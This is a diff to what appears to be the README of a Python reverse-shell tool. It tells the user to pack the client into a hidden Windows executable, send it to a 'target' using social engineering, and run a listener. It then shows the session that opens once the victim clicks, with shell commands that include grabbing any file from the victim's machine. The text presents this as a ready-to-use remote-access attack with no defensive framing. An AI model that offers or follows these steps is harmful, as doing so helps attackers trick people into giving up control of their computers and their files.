@@ -23,3 +23,35 @@ pyinstaller -F -w client.py
 
 yahoo next to send the exe to target .it needs some social enginnering skills
 
+o executing methods
+  
+  python3 myser.py
+  
+  enter the ip:192.168.43.155 (enter your ip here)
+  
+  enter the port:8080
+  
+  [+] listening for incoming connections
+  
+  [+] connection established ('192.168.43.155', 52902)(when target clicks the exe)
+  
+  shell>>ipconfig
+  
+  shell>>terminate(close the connection)
+  
+  shell>>dir (shows windows diectory)
+  
+  shell>>grab=(any file on target)
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+  
+
